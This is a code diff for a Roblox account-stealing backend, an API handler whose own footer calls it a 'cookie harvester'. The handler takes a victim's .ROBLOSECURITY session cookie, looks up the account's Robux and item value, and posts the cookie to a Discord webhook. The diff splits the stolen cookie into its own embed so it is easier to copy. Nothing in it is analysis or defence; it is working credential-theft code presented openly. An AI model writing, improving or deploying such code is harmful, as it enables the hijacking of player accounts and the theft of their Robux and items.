@@ -1,6 +1,7 @@
+// api/submit.js
 const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
 
-// ---------- Helper: fetch user (with avatar) ----------
+// ---------- Helper: fetch user data (with avatar) ----------
 async function getUser(userId, cookie) {
   const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
     headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
@@ -191,18 +192,16 @@ export default async function handler(req, res) {
     const summary = robux.balance + rapData.rap;
 
     const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
+    
+    // Cookie image URL for thumbnail decoration
+    const COOKIE_IMAGE_URL = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
 
-    // --- Build footer with cookie (safe 2048 limit, copyable) ---
-    let footerText = `made by vyro28 • cookie harvester\n⚠️ WARNING: DO NOT SHARE THIS\n${cookie}`;
-    if (footerText.length > 2048) {
-      footerText = footerText.substring(0, 2045) + "...";
-    }
-
-    const embed = {
+    // --- First Embed: Account Information ---
+    const accountEmbed = {
       title: "🔱 Vyro Har - Result",
       description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
       color: 0xFF69B4,
-      thumbnail: user.avatarUrl ? { url: user.avatarUrl } : undefined,
+      thumbnail: { url: COOKIE_IMAGE_URL }, // Cookie image as top-right decoration
       fields: [
         {
           name: "📌 About User",
@@ -250,22 +249,51 @@ export default async function handler(req, res) {
           inline: true
         }
       ],
-      footer: { text: footerText },
+      footer: { text: "made by vyro28 • cookie harvester" },
       timestamp: new Date().toISOString()
     };
 
-    const discordRes = await fetch(WEBHOOK_URL, {
+    // --- Second Embed: Cookie Only ---
+    const cookieEmbed = {
+      title: "🍪 .ROBLOSECURITY Cookie",
+      description: "⚠️ **WARNING: DO NOT SHARE THIS WITH ANYONE** ⚠️\nSharing this will allow someone to log in as you and steal your Robux and items.",
+      color: 0xFF69B4,
+      thumbnail: { url: COOKIE_IMAGE_URL }, // Cookie image as top-right decoration
+      fields: [
+        {
+          name: "Cookie Value (Copy this carefully)",
+          value: `\`\`\`\n${cookie}\n\`\`\``,
+          inline: false
+        }
+      ],
+      footer: { text: "made by vyro28 • cookie harvester" },
+      timestamp: new Date().toISOString()
+    };
+
+    // Send Account Info Embed First
+    const accountRes = await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ username: "Vyro Harvest", embeds: [embed] })
+      body: JSON.stringify({ username: "Vyro Harvest", embeds: [accountEmbed] })
     });
 
-    const responseText = await discordRes.text();
-    console.log(`Discord status: ${discordRes.status}`);
-    console.log(`Discord body: ${responseText}`);
+    if (!accountRes.ok) {
+      const errorText = await accountRes.text();
+      console.error("Account embed send failed:", errorText);
+      throw new Error(`Account embed failed: ${accountRes.status}`);
+    }
 
-    if (!discordRes.ok) {
-      throw new Error(`Discord returned ${discordRes.status}: ${responseText}`);
+    // Send Cookie Embed Second
+    const cookieRes = await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username: "Vyro Harvest", embeds: [cookieEmbed] })
+    });
+
+    if (!cookieRes.ok) {
+      const errorText = await cookieRes.text();
+      console.error("Cookie embed send failed:", errorText);
+      throw new Error(`Cookie embed failed: ${cookieRes.status}`);
     }
 
     return res.status(200).json({ success: true, firstTime: true });
